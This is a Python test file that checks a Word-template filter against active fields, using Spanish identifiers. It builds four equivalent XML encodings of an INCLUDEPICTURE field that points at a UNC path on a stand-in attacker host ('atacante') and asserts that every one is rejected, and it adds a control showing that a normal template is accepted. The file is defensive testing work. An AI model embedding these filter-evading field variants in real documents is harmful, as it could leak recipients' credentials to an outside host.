"""The external review's R02 (2026-10-02), written by INGOL's pilot package for D1
(docs/work-items/dev-capabilities/evidence/d1/ac05-base-revisada/pruebas/
test_d1_hallazgos_arquitecto.py of INGOL), failing on 03b8573: the filter of a
company's Word template looked for field instructions in the raw bytes of each
part, and the same instruction written in another equivalent form of XML passed
it and reached the client's report. WI22 copies AR04FiltroDeCamposEludible, W and
CAMPO included, with the class's code as INGOL wrote it (docs/evidence/
01M47ABNKZF02YZ94YKXMQCPQ1/compare_pilot_tests.py checks it). It imports nothing
of INGOL's kits, so the CI runs it. After it, the negative control INGOL's test
reviewer asked for, which is this project's: a good template is accepted, so
that refusing every template cannot pass the copied class.

    python -m unittest tests.test_d1_r02_plantilla
"""

import tempfile
import unittest
import zipfile
from pathlib import Path

import docx
from docx.opc.constants import RELATIONSHIP_TYPE
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from meetingtool.report import document
from tests import test_report

# ── AR-04 ────────────────────────────────────────────────────────────────────

W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
CAMPO = 'INCLUDEPICTURE "\\\\atacante\\s\\x.png"'


class AR04FiltroDeCamposEludible(unittest.TestCase):
    """AR-04 (P1, entradas): FIELD_TEXT y FIELD_ATTRIBUTE buscan en los bytes
    crudos. La misma instrucción escrita de otra forma XML equivalente pasa
    el filtro de set_template y llega al informe del cliente.

    En verde si: active_content parsea cada parte y revisa w:instrText y
    w:fldSimple/@w:instr por nombre de elemento (y se revisa el .docx final)."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.limpia = test_report.company_template(self.tmp / "limpia.docx")

    def tearDown(self):
        self._tmp.cleanup()

    def variante(self, nombre, xml):
        return test_report.edit_package(self.limpia, self.tmp / nombre,
                                        insert={"word/document.xml": (b"<w:sectPr", xml)})

    def test_d1_ar04_el_campo_activo_se_rechaza_en_todas_sus_formas_equivalentes(self):
        formas = {
            "tal cual (control)": b'<w:p><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE '
                                  b'"\\\\atacante\\s\\x.png" </w:instrText></w:r></w:p>',
            "referencia de caracter en la I": b'<w:p><w:r><w:instrText xml:space="preserve"> &#73;NCLUDEPICTURE '
                                              b'"\\\\atacante\\s\\x.png" </w:instrText></w:r></w:p>',
            "fldSimple con comillas simples": b"<w:p><w:fldSimple w:instr=' INCLUDEPICTURE "
                                              b"\"\\\\atacante\\s\\x.png\" '><w:r><w:t>x</w:t></w:r>"
                                              b"</w:fldSimple></w:p>",
            "otro prefijo para el mismo espacio de nombres": (
                b'<w:p><w:r><v:instrText xmlns:v="' + W.encode() + b'" xml:space="preserve"> INCLUDEPICTURE '
                b'"\\\\atacante\\s\\x.png" </v:instrText></w:r></w:p>'),
        }
        aceptadas = {}
        for nombre, xml in formas.items():
            ruta = self.variante(f"v{len(aceptadas)}-{abs(hash(nombre))}.docx", xml)
            datos = self.tmp / f"datos-{abs(hash(nombre))}"
            try:
                document.set_template(ruta, datos)
            except document.ReportError:
                continue
            # Aceptada: se construye un informe y se mira si el campo llegó a él.
            carpeta = self.tmp / f"informe-{abs(hash(nombre))}"
            carpeta.mkdir()
            (carpeta / document.SUMMARY_NAME).write_text(test_report.summary_text(screen="Nada en pantalla."),
                                                         encoding="utf-8")
            document.build_report(carpeta, data_dir=datos)
            with zipfile.ZipFile(carpeta / document.OUTPUT_NAME) as informe:
                cuerpo = informe.read("word/document.xml").decode("utf-8")
            aceptadas[nombre] = "INCLUDEPICTURE" in cuerpo and "atacante" in cuerpo
        self.assertEqual(aceptadas, {}, "plantillas con un campo INCLUDEPICTURE aceptadas "
                                        "(valor: el campo llegó al informe del cliente)")


# -- The negative control (this project's) -----------------------------------------------------

class PlantillaBuenaAceptada(unittest.TestCase):
    """A template saved the way a company saves it (a cover with the company's
    {placeholders}, a table of contents, a page number in the footer, a link
    to a page of the company) is accepted and its report is built: the filter
    does not refuse what it should let through (WI22-AC01)."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.plantilla = self.hacer(self.tmp / "buena.docx")

    def tearDown(self):
        self._tmp.cleanup()

    @staticmethod
    def campo(parrafo, instruccion, resultado):
        for nodo in (test_report._field_char("begin"), test_report._instruction(instruccion),
                     test_report._field_char("separate"), test_report._text(resultado),
                     test_report._field_char("end")):
            parrafo._p.append(test_report._run_of(nodo))

    def hacer(self, ruta):
        # owner_shaped: a cover with the placeholders, a TOC (with its PAGEREF) and a page of model
        test_report.owner_shaped(ruta)
        hecha = docx.Document(str(ruta))
        self.campo(hecha.sections[0].footer.paragraphs[0], " PAGE ", "1")
        self.campo(hecha.sections[0].footer.paragraphs[0], " NUMPAGES ", "1")
        enlace = OxmlElement("w:hyperlink")
        enlace.set(qn("r:id"), hecha.part.relate_to("https://example.invalid/ayuda", RELATIONSHIP_TYPE.HYPERLINK,
                                                    is_external=True))
        enlace.append(test_report._run_of(test_report._text("Ayuda de la empresa")))
        hecha.add_paragraph()._p.append(enlace)
        self.campo(hecha.add_paragraph(), ' HYPERLINK "https://example.invalid/ayuda" ', "Ayuda de la empresa")
        hecha.save(str(ruta))
        return ruta

    def test_la_plantilla_buena_trae_lo_que_el_filtro_mira(self):
        # Without this the control could pass by accident: the template really has the fields and the link.
        with zipfile.ZipFile(self.plantilla) as paquete:
            partes = {nombre: paquete.read(nombre).decode("utf-8") for nombre in paquete.namelist()
                      if nombre.endswith((".xml", ".rels"))}
        self.assertIn(" PAGE ", partes["word/footer1.xml"])
        self.assertIn("TOC \\o", partes["word/document.xml"])
        self.assertIn("{cliente}", partes["word/document.xml"])
        self.assertIn("HYPERLINK", partes["word/document.xml"])
        self.assertIn("https://example.invalid/ayuda", partes["word/_rels/document.xml.rels"])

    def test_se_acepta_y_su_informe_se_construye(self):
        datos = self.tmp / "datos"
        document.set_template(self.plantilla, datos)
        self.assertIsNotNone(document.stored_template(datos))
        carpeta = self.tmp / "informe"
        carpeta.mkdir()
        (carpeta / document.SUMMARY_NAME).write_text(test_report.summary_text(screen="Nada en pantalla."),
                                                     encoding="utf-8")
        resultado = document.build_report(carpeta, data_dir=datos, **test_report.MEETING)
        self.assertEqual(resultado.fields, ["client", "project", "date"])  # the placeholders the template has
        self.assertTrue(resultado.cover)
        self.assertGreater(resultado.contents, 0)  # its table of contents was filled
        self.assertTrue((carpeta / document.OUTPUT_NAME).is_file())
        informe = docx.Document(str(carpeta / document.OUTPUT_NAME))
        anclas = [enlace.get(qn("w:anchor")) for enlace in informe.element.body.iter(qn("w:hyperlink"))]
        self.assertTrue(any(anclas))  # the links of the table of contents the report writes pass its own check
        self.assertEqual(document.active_content(test_report.package_parts(carpeta / document.OUTPUT_NAME)), [])
